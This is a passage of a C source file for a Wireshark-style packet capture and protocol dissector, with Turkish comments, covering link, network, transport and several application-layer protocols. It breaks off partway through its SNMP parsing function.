/*
 * full_monitor.c — Wireshark-style full packet capture engine
 * Her paketi layer layer dissect eder, her portu gösterir.
 * UDP'ye takılmaz, her protokolü görür.
 */

#include "network_monitor.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <time.h>
#include <stdarg.h>

#ifdef PLATFORM_LINUX
#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <fcntl.h>
#endif

#ifdef PLATFORM_WINDOWS
typedef unsigned char u_char;
struct dummy_timeval { long tv_sec; long tv_usec; };
struct pcap_pkthdr {
    struct dummy_timeval ts;
    unsigned int caplen;
    unsigned int len;
};
typedef void pcap_t;
#define DLT_EN10MB 1
static inline void *pcap_open_live(const char *device, int snaplen, int promisc, int to_ms, char *errbuf) { return NULL; }
static inline int pcap_datalink(void *p) { return 1; }
static inline void pcap_close(void *p) {}
#endif

static int initialized = 0;
static int running = 0;
static platform_mutex_t global_lock;

/* ---- CIRCULAR PACKET BUFFER (tüm paketler sırayla) ---- */
#define PACKET_BUFFER_SIZE 10000
static PacketRecord packet_buffer[PACKET_BUFFER_SIZE];
static int write_idx = 0;       /* sonraki yazılacak slot (mod PACKET_BUFFER_SIZE) */
static int packet_count = 0;    /* buffer'daki gerçek paket sayısı (max PACKET_BUFFER_SIZE) */
static int total_captured = 0;  /* toplam yakalanan paket (kümülatif, sadece stats için) */

/* ---- STATS ---- */
static FullStats stats;

#ifdef PLATFORM_LINUX
static pcap_t *pcap_handle = NULL;
static int g_datalink_type = 1; /* DLT_EN10MB default */
#endif

/* ==================================================================
 *   DISSECTOR LAYER — her protokol için ayrı fonksiyon
 * ================================================================== */
static void dissect_ipv4(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_ipv6(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_arp(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_icmp(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_tcp(PacketRecord *pkt, const u_char *data, int len, int base_off, int ip_payload_len);
static void dissect_udp(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_dns(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_dns_tcp(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_http(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_tls(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_dhcp(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_mdns(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_llmnr(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_netbios(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_ssdp(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_ntp(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_snmp(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_syslog(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_tftp(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_mysql(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_postgres(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_redis(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_mongodb(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_ssh(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_ftp(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_smtp(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_pop3(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_imap(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_rdp(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_vnc(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_stun(PacketRecord *pkt, const u_char *data, int len, int base_off);
static void dissect_raw_text(PacketRecord *pkt, const u_char *data, int len, int base_off, int sport, int dport);
static int parse_dns_name(char *out, int out_len, const u_char *data, int off, int max_off);

static void add_layer(PacketRecord *pkt, PduLayerType type, const char *name,
                      const char *summary, int offset, int len, const char *fields_fmt, ...) {
    if (pkt->layer_count >= MAX_LAYERS) return;
    PduLayer *L = &pkt->layers[pkt->layer_count++];
    L->type = type;
    strncpy(L->name, name, sizeof(L->name) - 1);
    strncpy(L->summary, summary, sizeof(L->summary) - 1);
    L->offset = offset;
    L->length = len;

    if (fields_fmt) {
        va_list va;
        va_start(va, fields_fmt);
        vsnprintf(L->fields, sizeof(L->fields), fields_fmt, va);
        va_end(va);
    } else {
        L->fields[0] = '\0';
    }
}

/* ---------- ETHERNET ---------- */
static void dissect_ethernet(PacketRecord *pkt, const u_char *data, int caplen) {
    if (caplen < 14) return;

    snprintf(pkt->dst_mac, sizeof(pkt->dst_mac), "%02x:%02x:%02x:%02x:%02x:%02x",
             data[0], data[1], data[2], data[3], data[4], data[5]);
    snprintf(pkt->src_mac, sizeof(pkt->src_mac), "%02x:%02x:%02x:%02x:%02x:%02x",
             data[6], data[7], data[8], data[9], data[10], data[11]);

    int eth_type = (data[12] << 8) | data[13];
    int off = 14;

    /* VLAN tag (802.1Q, 802.1ad) atla */
    while ((eth_type == 0x8100 || eth_type == 0x88a8) && caplen >= off + 4) {
        eth_type = (data[off + 2] << 8) | data[off + 3];
        off += 4;
    }

    char summary[128];
    snprintf(summary, sizeof(summary), "Src: %s → Dst: %s", pkt->src_mac, pkt->dst_mac);
    add_layer(pkt, LAYER_ETHERNET, "Ethernet II", summary, 0, off,
              "Destination: %s\nSource: %s\nType: 0x%04x",
              pkt->dst_mac, pkt->src_mac, eth_type);

    /* Sonraki katmana geç */
    switch (eth_type) {
        case 0x0800: dissect_ipv4(pkt, data + off, caplen - off, off); break;
        case 0x0806: dissect_arp(pkt, data + off, caplen - off, off); break;
        case 0x86dd: dissect_ipv6(pkt, data + off, caplen - off, off); break;
        default:
            strncpy(pkt->protocol, "ETH", sizeof(pkt->protocol) - 1);
            snprintf(pkt->info, sizeof(pkt->info), "Ethernet type 0x%04x", eth_type);
            break;
    }
}

/* ---------- Linux SLL (Cooked Capture) ---------- */
/* Used by the 'any' pseudo-device. Header is 16 bytes:
 *   [0-1]  Packet type (0=unicast to us, 4=sent by us, ...)
 *   [2-3]  ARPHRD type
 *   [4-5]  Link-layer address length
 *   [6-13] Link-layer address (8 bytes, zero-padded)
 *   [14-15] EtherType
 */
static void dissect_linux_sll(PacketRecord *pkt, const u_char *data, int caplen) {
    if (caplen < 16) return;

    int pkt_type = (data[0] << 8) | data[1];
    int addr_len = (data[4] << 8) | data[5];
    int eth_type = (data[14] << 8) | data[15];

    /* Extract MAC from SLL header if available */
    if (addr_len >= 6) {
        snprintf(pkt->src_mac, sizeof(pkt->src_mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                 data[6], data[7], data[8], data[9], data[10], data[11]);
    }
    /* SLL doesn't give us the destination MAC directly */
    if (pkt_type == 0) {
        strncpy(pkt->dst_mac, "(us)", sizeof(pkt->dst_mac) - 1);
    } else if (pkt_type == 4) {
        /* Outgoing: source is us, swap */
        strncpy(pkt->dst_mac, pkt->src_mac, sizeof(pkt->dst_mac) - 1);
        strncpy(pkt->src_mac, "(us)", sizeof(pkt->src_mac) - 1);
    }

    char summary[128];
    snprintf(summary, sizeof(summary), "Linux SLL type=%d ethertype=0x%04x", pkt_type, eth_type);
    add_layer(pkt, LAYER_ETHERNET, "Linux Cooked Capture", summary, 0, 16,
              "Packet Type: %d\nAddress Length: %d\nEtherType: 0x%04x",
              pkt_type, addr_len, eth_type);

    int off = 16;
    switch (eth_type) {
        case 0x0800: dissect_ipv4(pkt, data + off, caplen - off, off); break;
        case 0x0806: dissect_arp(pkt, data + off, caplen - off, off); break;
        case 0x86dd: dissect_ipv6(pkt, data + off, caplen - off, off); break;
        default:
            strncpy(pkt->protocol, "SLL", sizeof(pkt->protocol) - 1);
            snprintf(pkt->info, sizeof(pkt->info), "SLL type 0x%04x", eth_type);
            break;
    }
}

/* ---------- IPv4 ---------- */
static void dissect_ipv4(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 20) return;
    int ver_ihl = data[0];
    int ihl = (ver_ihl & 0x0F) * 4;
    if (ihl < 20 || ihl > len) return;

    snprintf(pkt->src_ip, sizeof(pkt->src_ip), "%d.%d.%d.%d",
             data[12], data[13], data[14], data[15]);
    snprintf(pkt->dst_ip, sizeof(pkt->dst_ip), "%d.%d.%d.%d",
             data[16], data[17], data[18], data[19]);

    pkt->ttl = data[8];
    int proto = data[9];
    int total_len = (data[2] << 8) | data[3];

    char summary[128];
    snprintf(summary, sizeof(summary), "Src: %s → Dst: %s TTL=%d",
             pkt->src_ip, pkt->dst_ip, pkt->ttl);
    add_layer(pkt, LAYER_IPV4, "Internet Protocol Version 4", summary, base_off, ihl,
              "Version: 4\nHeader Length: %d bytes\nTotal Length: %d\n"
              "Identification: 0x%04x\nFlags: 0x%x\nTTL: %d\nProtocol: %d\n"
              "Source: %s\nDestination: %s",
              ihl, total_len,
              (data[4] << 8) | data[5], (data[6] >> 5) & 7,
              pkt->ttl, proto, pkt->src_ip, pkt->dst_ip);

    int next_off = base_off + ihl;
    int remaining = len - ihl;

    switch (proto) {
        case 1:  dissect_icmp(pkt, data + ihl, remaining, next_off); break;
        case 6:  dissect_tcp(pkt, data + ihl, remaining, next_off, total_len - ihl); break;
        case 17: dissect_udp(pkt, data + ihl, remaining, next_off); break;
        default:
            strncpy(pkt->protocol, "IPv4", sizeof(pkt->protocol) - 1);
            snprintf(pkt->info, sizeof(pkt->info), "Protocol %d (%s)", proto, ip_proto_name(proto));
            break;
    }
}

/* ---------- IPv6 ---------- */
static void dissect_ipv6(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 40) return;
    // next header
    int next_hdr = data[6];
    // IP'leri yaz
    snprintf(pkt->src_ip, sizeof(pkt->src_ip),
             "%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x",
             data[8], data[9], data[10], data[11], data[12], data[13], data[14], data[15],
             data[16], data[17], data[18], data[19], data[20], data[21], data[22], data[23]);
    snprintf(pkt->dst_ip, sizeof(pkt->dst_ip),
             "%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x",
             data[24], data[25], data[26], data[27], data[28], data[29], data[30], data[31],
             data[32], data[33], data[34], data[35], data[36], data[37], data[38], data[39]);

    strncpy(pkt->protocol, "IPv6", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%s → %s Next: %d",
             pkt->src_ip, pkt->dst_ip, next_hdr);
}

/* ---------- ARP ---------- */
static void dissect_arp(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 28) return;
    int htype = (data[0] << 8) | data[1];
    int ptype = (data[2] << 8) | data[3];
    // int hlen = data[4];
    // int plen = data[5];
    int op = (data[6] << 8) | data[7];

    const char *op_str = (op == 1) ? "Request" : (op == 2) ? "Reply" : "Unknown";
    char sha[18], spa[16], tha[18], tpa[16];
    snprintf(sha, sizeof(sha), "%02x:%02x:%02x:%02x:%02x:%02x",
             data[8], data[9], data[10], data[11], data[12], data[13]);
    snprintf(spa, sizeof(spa), "%d.%d.%d.%d", data[14], data[15], data[16], data[17]);
    snprintf(tha, sizeof(tha), "%02x:%02x:%02x:%02x:%02x:%02x",
             data[18], data[19], data[20], data[21], data[22], data[23]);
    snprintf(tpa, sizeof(tpa), "%d.%d.%d.%d", data[24], data[25], data[26], data[27]);

    strncpy(pkt->protocol, "ARP", sizeof(pkt->protocol) - 1);
    if (op == 1)
        snprintf(pkt->info, sizeof(pkt->info), "Who has %s? Tell %s", tpa, spa);
    else
        snprintf(pkt->info, sizeof(pkt->info), "%s is at %s", spa, sha);

    add_layer(pkt, LAYER_ARP, "Address Resolution Protocol", pkt->info, base_off, 28,
              "Hardware type: %d\nProtocol type: 0x%04x\nOpcode: %s (%d)\n"
              "Sender MAC: %s\nSender IP: %s\nTarget MAC: %s\nTarget IP: %s",
              htype, ptype, op_str, op, sha, spa, tha, tpa);

    __sync_fetch_and_add(&stats.arp, 1);
}

/* ---------- ICMP ---------- */
static void dissect_icmp(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 8) return;
    int type = data[0];
    int code = data[1];

    const char *type_str;
    switch (type) {
        case 0:  type_str = "Echo Reply"; break;
        case 3:  type_str = "Destination Unreachable"; break;
        case 5:  type_str = "Redirect"; break;
        case 8:  type_str = "Echo Request"; break;
        case 11: type_str = "Time Exceeded"; break;
        default: type_str = "Other"; break;
    }

    strncpy(pkt->protocol, "ICMP", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%s (type=%d code=%d)", type_str, type, code);
    add_layer(pkt, LAYER_ICMP, "Internet Control Message Protocol", pkt->info, base_off, len,
              "Type: %d (%s)\nCode: %d\nChecksum: 0x%04x",
              type, type_str, code, (data[2] << 8) | data[3]);

    __sync_fetch_and_add(&stats.icmp, 1);
}

/* ---------- TCP ---------- */
static void dissect_tcp(PacketRecord *pkt, const u_char *data, int len, int base_off, int ip_payload_len) {
    if (len < 20) return;
    int sport = (data[0] << 8) | data[1];
    int dport = (data[2] << 8) | data[3];
    int seq = (data[4] << 24) | (data[5] << 16) | (data[6] << 8) | data[7];
    int ack = (data[8] << 24) | (data[9] << 16) | (data[10] << 8) | data[11];
    int off_flags = (data[12] << 8) | data[13];
    int hdr_len = ((off_flags >> 12) & 0xF) * 4;
    int flags = off_flags & 0x3F;
    int window = (data[14] << 8) | data[15];
    int payload_len = ip_payload_len - hdr_len;

    snprintf(pkt->src_port, sizeof(pkt->src_port), "%d", sport);
    snprintf(pkt->dst_port, sizeof(pkt->dst_port), "%d", dport);

    /* Flags string */
    char fbuf[32] = {0};
    if (flags & 0x02) strncat(fbuf, "SYN ", sizeof(fbuf) - strlen(fbuf) - 1);
    if (flags & 0x10) strncat(fbuf, "ACK ", sizeof(fbuf) - strlen(fbuf) - 1);
    if (flags & 0x01) strncat(fbuf, "FIN ", sizeof(fbuf) - strlen(fbuf) - 1);
    if (flags & 0x04) strncat(fbuf, "RST ", sizeof(fbuf) - strlen(fbuf) - 1);
    if (flags & 0x08) strncat(fbuf, "PSH ", sizeof(fbuf) - strlen(fbuf) - 1);
    if (flags & 0x20) strncat(fbuf, "URG ", sizeof(fbuf) - strlen(fbuf) - 1);

    strncpy(pkt->protocol, "TCP", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%d → %d [%s] Seq=%d Ack=%d Win=%d Len=%d",
             sport, dport, fbuf, seq, ack, window, payload_len > 0 ? payload_len : 0);
    strncpy(pkt->flags, fbuf, sizeof(pkt->flags) - 1);

    add_layer(pkt, LAYER_TCP, "Transmission Control Protocol", pkt->info, base_off, hdr_len,
              "Source Port: %d (%s)\nDestination Port: %d (%s)\n"
              "Sequence Number: %d\nAcknowledgment Number: %d\n"
              "Header Length: %d bytes\nFlags: 0x%02x (%s)\nWindow: %d",
              sport, svc_name(sport), dport, svc_name(dport),
              seq, ack, hdr_len, flags, fbuf, window);

    __sync_fetch_and_add(&stats.tcp, 1);

    /* Application layer dissection */
    int app_off = base_off + hdr_len;
    const u_char *app = data + hdr_len;
    if (payload_len > 0) {
        if (sport == 80 || dport == 80 || sport == 8080 || dport == 8080 || sport == 8000 || dport == 8000)
            dissect_http(pkt, app, payload_len, app_off);
        else if (sport == 443 || dport == 443 || sport == 8443 || dport == 8443)
            dissect_tls(pkt, app, payload_len, app_off);
        else if (sport == 22 || dport == 22)
            dissect_ssh(pkt, app, payload_len, app_off);
        else if (sport == 21 || dport == 21)
            dissect_ftp(pkt, app, payload_len, app_off);
        else if (sport == 25 || dport == 25 || sport == 587 || dport == 587)
            dissect_smtp(pkt, app, payload_len, app_off);
        else if (sport == 110 || dport == 110)
            dissect_pop3(pkt, app, payload_len, app_off);
        else if (sport == 143 || dport == 143 || sport == 993 || dport == 993)
            dissect_imap(pkt, app, payload_len, app_off);
        else if (sport == 53 || dport == 53)
            dissect_dns_tcp(pkt, app, payload_len, app_off);
        else if (sport == 3306 || dport == 3306)
            dissect_mysql(pkt, app, payload_len, app_off);
        else if (sport == 5432 || dport == 5432)
            dissect_postgres(pkt, app, payload_len, app_off);
        else if (sport == 6379 || dport == 6379)
            dissect_redis(pkt, app, payload_len, app_off);
        else if (sport == 27017 || dport == 27017)
            dissect_mongodb(pkt, app, payload_len, app_off);
        else if (sport == 3389 || dport == 3389)
            dissect_rdp(pkt, app, payload_len, app_off);
        else if (sport == 5900 || dport == 5900 || sport == 5901 || dport == 5901)
            dissect_vnc(pkt, app, payload_len, app_off);
        else if (payload_len < 256)
            dissect_raw_text(pkt, app, payload_len, app_off, sport, dport);
    }
}

/* ---------- UDP ---------- */
static void dissect_udp(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 8) return;
    int sport = (data[0] << 8) | data[1];
    int dport = (data[2] << 8) | data[3];
    int ulen = (data[4] << 8) | data[5];

    snprintf(pkt->src_port, sizeof(pkt->src_port), "%d", sport);
    snprintf(pkt->dst_port, sizeof(pkt->dst_port), "%d", dport);

    strncpy(pkt->protocol, "UDP", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%d → %d Len=%d", sport, dport, ulen);

    add_layer(pkt, LAYER_UDP, "User Datagram Protocol", pkt->info, base_off, 8,
              "Source Port: %d (%s)\nDestination Port: %d (%s)\nLength: %d",
              sport, svc_name(sport), dport, svc_name(dport), ulen);

    __sync_fetch_and_add(&stats.udp, 1);

    /* Application layer */
    int payload_len = ulen - 8;
    int app_off = base_off + 8;
    const u_char *app = data + 8;

    if (payload_len > 0) {
        if (sport == 53 || dport == 53)
            dissect_dns(pkt, app, payload_len, app_off);
        else if (sport == 67 || dport == 67 || sport == 68 || dport == 68)
            dissect_dhcp(pkt, app, payload_len, app_off);
        else if (sport == 137 || dport == 137 || sport == 138 || dport == 138)
            dissect_netbios(pkt, app, payload_len, app_off);
        else if (sport == 5353 || dport == 5353)
            dissect_mdns(pkt, app, payload_len, app_off);
        else if (sport == 5355 || dport == 5355)
            dissect_llmnr(pkt, app, payload_len, app_off);
        else if (sport == 1900 || dport == 1900)
            dissect_ssdp(pkt, app, payload_len, app_off);
        else if (sport == 123 || dport == 123)
            dissect_ntp(pkt, app, payload_len, app_off);
        else if (sport == 161 || dport == 161 || sport == 162 || dport == 162)
            dissect_snmp(pkt, app, payload_len, app_off);
        else if (sport == 514 || dport == 514)
            dissect_syslog(pkt, app, payload_len, app_off);
        else if (sport == 69 || dport == 69)
            dissect_tftp(pkt, app, payload_len, app_off);
        else if (sport == 3478 || dport == 3478 || sport == 3479 || dport == 3479)
            dissect_stun(pkt, app, payload_len, app_off);
        else if (payload_len < 256)
            dissect_raw_text(pkt, app, payload_len, app_off, sport, dport);
    }
}

/* ---------- DNS ---------- */
static void dissect_dns(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 12) return;
    int tx_id = (data[0] << 8) | data[1];
    int flags = (data[2] << 8) | data[3];
    int qdcount = (data[4] << 8) | data[5];
    int ancount = (data[6] << 8) | data[7];
    int nscount = (data[8] << 8) | data[9];
    int arcount = (data[10] << 8) | data[11];
    int is_resp = (flags & 0x8000) ? 1 : 0;
    int opcode = (flags >> 11) & 0xF;
    int rcode = flags & 0xF;

    /* İlk sorgu adını çözmeye çalış */
    char qname[256] = "?";
    if (!is_resp && len > 12) {
        parse_dns_name(qname, sizeof(qname), data, 12, len);
    }

    strncpy(pkt->protocol, "DNS", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%s TX=0x%04x %s Q=%d R=%d",
             is_resp ? "Response" : "Query", tx_id, qname, qdcount, ancount);

    add_layer(pkt, LAYER_DNS, "Domain Name System", pkt->info, base_off, len,
              "Transaction ID: 0x%04x\nFlags: 0x%04x\nOpcode: %d\nResponse: %s\n"
              "Questions: %d\nAnswers: %d\nAuthority: %d\nAdditional: %d\nReturn Code: %d",
              tx_id, flags, opcode, is_resp ? "Yes" : "No",
              qdcount, ancount, nscount, arcount, rcode);

    __sync_fetch_and_add(&stats.dns, 1);
}

/* ---------- DNS TCP ---------- */
static void dissect_dns_tcp(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 2) return;
    // int dns_len = (data[0] << 8) | data[1];
    if (len - 2 > 0) dissect_dns(pkt, data + 2, len - 2, base_off + 2);
}

/* ---------- HTTP/HTTPS ---------- */
static void dissect_http(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 4) return;

    /* Metot kontrolü */
    int is_http = 0;
    const char *methods[] = {"GET ", "POST", "PUT ", "PATC", "HEAD", "DELE", "OPTI", "CONN", "HTTP"};
    for (int i = 0; i < 9; i++) {
        if (len >= 4 && memcmp(data, methods[i], 4) == 0) { is_http = 1; break; }
    }
    if (!is_http) return;

    /* İlk satırı al */
    char line[512];
    int copy_len = (len < (int)sizeof(line) - 1) ? len : (int)sizeof(line) - 1;
    memcpy(line, data, copy_len);
    line[copy_len] = '\0';
    char *cr = strpbrk(line, "\r\n");
    if (cr) *cr = '\0';

    strncpy(pkt->protocol, "HTTP", sizeof(pkt->protocol) - 1);
    strncpy(pkt->info, line, sizeof(pkt->info) - 1);

    add_layer(pkt, LAYER_HTTP, "Hypertext Transfer Protocol", line, base_off, len,
              "%s", line);
    __sync_fetch_and_add(&stats.http, 1);
}

/* ---------- TLS ---------- */
static void dissect_tls(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 5) return;
    if (data[0] < 20 || data[0] > 23 || data[1] != 3) return;

    int ct = data[0];
    int version = (data[1] << 8) | data[2];
    int tls_len = (data[3] << 8) | data[4];

    const char *ct_str = (ct == 20) ? "Change Cipher Spec" :
                         (ct == 21) ? "Alert" :
                         (ct == 22) ? "Handshake" :
                         (ct == 23) ? "Application Data" : "Unknown";

    char vstr[16];
    if (version == 0x0301) snprintf(vstr, sizeof(vstr), "TLSv1.0");
    else if (version == 0x0302) snprintf(vstr, sizeof(vstr), "TLSv1.1");
    else if (version == 0x0303) snprintf(vstr, sizeof(vstr), "TLSv1.2");
    else if (version == 0x0304) snprintf(vstr, sizeof(vstr), "TLSv1.3");
    else snprintf(vstr, sizeof(vstr), "0x%04x", version);

    strncpy(pkt->protocol, "TLS", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%s %s Len=%d", vstr, ct_str, tls_len);

    add_layer(pkt, LAYER_TLS, "Transport Layer Security", pkt->info, base_off, len,
              "Content Type: %d (%s)\nVersion: %s\nLength: %d", ct, ct_str, vstr, tls_len);
    __sync_fetch_and_add(&stats.tls, 1);

    /* Client Hello / Server Hello içinde SNI varsa */
    if (ct == 22 && len > 43 && data[5] == 1) { // Handshake: ClientHello
        int sni_offset = 43 + 32; // skip random + session
        if (len > sni_offset + 4) {
            int cipher_len = (data[sni_offset] << 8) | data[sni_offset + 1];
            sni_offset += 2 + cipher_len;
            if (len > sni_offset + 2) {
                int comp_len = data[sni_offset];
                sni_offset += 1 + comp_len;
                if (len > sni_offset + 4) {
                    int ext_len = (data[sni_offset] << 8) | data[sni_offset + 1];
                    sni_offset += 2;
                    // extensions içinde SNI (type=0) ara
                    int ext_end = sni_offset + ext_len;
                    while (sni_offset + 4 <= ext_end && sni_offset + 4 <= len) {
                        int ext_type = (data[sni_offset] << 8) | data[sni_offset + 1];
                        int ext_data_len = (data[sni_offset + 2] << 8) | data[sni_offset + 3];
                        sni_offset += 4;
                        if (ext_type == 0 && ext_data_len > 5 && sni_offset + ext_data_len <= len) {
                            int sni_list_len = (data[sni_offset] << 8) | data[sni_offset + 1];
                            if (sni_list_len > 3 && sni_offset + 3 + sni_list_len <= len) {
                                int name_len = (data[sni_offset + 3] << 8) | data[sni_offset + 4];
                                if (name_len > 0 && sni_offset + 5 + name_len <= len) {
                                    char sni[256];
                                    int nlen = (name_len < 255) ? name_len : 255;
                                    memcpy(sni, data + sni_offset + 5, nlen);
                                    sni[nlen] = '\0';
                                    // Info'ya ekle
                                    char tmp[512];
                                    snprintf(tmp, sizeof(tmp), "%s [SNI: %s]", pkt->info, sni);
                                    strncpy(pkt->info, tmp, sizeof(pkt->info) - 1);
                                }
                            }
                            break;
                        }
                        sni_offset += ext_data_len;
                    }
                }
            }
        }
    }
}

/* ---------- DHCP ---------- */
static void dissect_dhcp(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 240) return;
    int op = data[0];
    int dhcp_type = 0;
    char server_ip[16] = "?", client_ip[16], yiaddr[16];

    snprintf(client_ip, sizeof(client_ip), "%d.%d.%d.%d", data[12], data[13], data[14], data[15]);
    snprintf(yiaddr, sizeof(yiaddr), "%d.%d.%d.%d", data[16], data[17], data[18], data[19]);

    /* DHCP option 53 (message type) */
    for (int i = 240; i < len - 2; ) {
        if (data[i] == 255) break;
        if (data[i] == 0) { i++; continue; }
        if (data[i] == 53 && i + 2 < len) {
            dhcp_type = data[i + 2];
            break;
        }
        i += data[i + 1] + 2;
    }

    const char *type_str = "";
    switch (dhcp_type) {
        case 1: type_str = "DISCOVER"; break;
        case 2: type_str = "OFFER"; break;
        case 3: type_str = "REQUEST"; break;
        case 4: type_str = "DECLINE"; break;
        case 5: type_str = "ACK"; break;
        case 6: type_str = "NAK"; break;
        case 7: type_str = "RELEASE"; break;
        case 8: type_str = "INFORM"; break;
    }

    strncpy(pkt->protocol, "DHCP", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%s %s → %s", type_str, client_ip, yiaddr);

    add_layer(pkt, LAYER_DHCP, "Dynamic Host Configuration Protocol", pkt->info, base_off, len,
              "Op: %s (%d)\nClient IP: %s\nYour IP: %s\nServer IP: %s\nMessage Type: %s (%d)",
              op == 1 ? "Request" : "Reply", op, client_ip, yiaddr, server_ip, type_str, dhcp_type);

    __sync_fetch_and_add(&stats.dhcp, 1);
}

/* ---------- mDNS ---------- */
static void dissect_mdns(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 12) return;
    // int tx_id = (data[0] << 8) | data[1];  // 0 for mDNS
    int flags = (data[2] << 8) | data[3];
    int is_resp = (flags & 0x8000) ? 1 : 0;

    char qname[256] = "?";
    parse_dns_name(qname, sizeof(qname), data, 12, len);

    strncpy(pkt->protocol, "mDNS", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%s %s", is_resp ? "Response" : "Query", qname);
    add_layer(pkt, LAYER_MDNS, "Multicast DNS", pkt->info, base_off, len, "Name: %s", qname);
    __sync_fetch_and_add(&stats.mdns, 1);
}

/* ---------- LLMNR ---------- */
static void dissect_llmnr(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 12) return;
    char qname[256] = "?";
    parse_dns_name(qname, sizeof(qname), data, 12, len);

    strncpy(pkt->protocol, "LLMNR", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "Query %s", qname);
    add_layer(pkt, LAYER_LLMNR, "Link-Local Multicast Name Resolution", pkt->info, base_off, len, "Name: %s", qname);
}

/* ---------- NetBIOS ---------- */
static void dissect_netbios(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 4) return;
    int type = data[0];
    int opcode = (data[1] >> 3) & 0x0F;
    // int nm_flags = data[1] & 7;

    const char *type_str = (type == 0) ? "Query" :
                           (type == 0x20) ? "Session" : "Other";

    strncpy(pkt->protocol, "NetBIOS", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "%s op=%d", type_str, opcode);
    add_layer(pkt, LAYER_NETBIOS, "NetBIOS", pkt->info, base_off, len, "Type: %d (%s)\nOpcode: %d", type, type_str, opcode);
}

/* ---------- SSDP ---------- */
static void dissect_ssdp(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    char line[256];
    int copy_len = (len < 255) ? len : 255;
    memcpy(line, data, copy_len);
    line[copy_len] = '\0';
    char *cr = strpbrk(line, "\r\n");
    if (cr) *cr = '\0';

    strncpy(pkt->protocol, "SSDP", sizeof(pkt->protocol) - 1);
    strncpy(pkt->info, line, sizeof(pkt->info) - 1);
    add_layer(pkt, LAYER_SSDP, "Simple Service Discovery Protocol", line, base_off, len, "%s", line);
}

/* ---------- NTP ---------- */
static void dissect_ntp(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 4) return;
    int mode = data[0] & 0x07;
    int version = (data[0] >> 3) & 0x07;
    int stratum = data[1];

    const char *mode_str = (mode == 3) ? "Client" : (mode == 4) ? "Server" : "Other";

    strncpy(pkt->protocol, "NTP", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "v%d %s stratum=%d", version, mode_str, stratum);
    add_layer(pkt, LAYER_NTP, "Network Time Protocol", pkt->info, base_off, len,
              "Version: %d\nMode: %d (%s)\nStratum: %d", version, mode, mode_str, stratum);
}

/* ---------- SNMP ---------- */
static void dissect_snmp(PacketRecord *pkt, const u_char *data, int len, int base_off) {
    if (len < 6) return;
    /* SNMP version ve community basitçe */
    int ver = data[0];
    strncpy(pkt->protocol, "SNMP", sizeof(pkt->protocol) - 1);
    snprintf(pkt->info, sizeof(pkt->info), "v%d Len=%d", ver, len);
    add_layer(pkt, LAYER_SNMP, "Simple Network Management Protocol", pkt->info, base_off, len,
              "Version: %d", ver);
